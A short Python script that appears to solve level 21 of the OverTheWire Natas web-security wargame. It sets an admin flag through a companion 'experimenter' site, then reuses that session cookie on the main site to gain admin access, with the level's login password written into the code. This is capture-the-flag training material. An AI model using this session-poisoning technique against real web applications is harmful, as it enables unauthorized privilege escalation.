
#"""
import requests

baseUrl = 'http://natas21-experimenter.natas.labs.overthewire.org'
auth = ('natas21', 'IFekPyrQXftziDEsUr3x21sYuahypdgJ')
params = dict(debug='', submit='', admin=1)
cookies = dict()
r = requests.get(baseUrl, auth=auth, params=params, cookies=cookies)
phpsessid = r.cookies['PHPSESSID']
print(r.text)
print('---------------------------------------------------------------------------------------')
baseUrl = 'http://natas21.natas.labs.overthewire.org'
params = dict(debug='')
cookies = dict(PHPSESSID=phpsessid)
r = requests.get(baseUrl, auth=auth, params=params, cookies=cookies)
print(r.text)
#"""

# import urllib.request
# # Create an OpenerDirector with support for Basic HTTP Authentication...
# auth_handler = urllib.request.HTTPBasicAuthHandler()
# auth_handler.add_password(realm='PDQ Application',
#                           uri='http://natas21-experimenter.natas.labs.overthewire.org',
#                           user='natas21',
#                           passwd='IFekPyrQXftziDEsUr3x21sYuahypdgJ')
# opener = urllib.request.build_opener(auth_handler)
# # ...and install it globally so it can be used with urlopen.
# urllib.request.install_opener(opener)
# urllib.request.urlopen('http://www.example.com/login.html')
